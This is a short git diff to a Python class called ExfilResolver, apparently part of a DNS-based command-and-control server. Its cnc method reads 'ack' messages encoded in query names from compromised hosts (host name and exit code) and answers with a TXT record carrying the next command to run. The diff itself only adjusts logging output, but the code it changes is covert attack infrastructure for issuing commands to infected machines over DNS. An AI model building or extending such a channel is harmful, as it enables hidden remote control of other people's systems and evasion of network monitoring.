@@ -85,12 +85,11 @@ class ExfilResolver(BaseResolver):
     def cnc(self, request, qname):
         reply = request.reply()
 
-        print(qname)
         if len(qname.split(".")) > 2:
             if qname.split(".")[-2] == "ack":
                 retcode = qname.split(".")[0]
                 host = qname.split(".")[1]
-                print(host, retcode)
+                print("host:", host, "exited", retcode)
                 reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
             else:
                 # print(host, "listening")
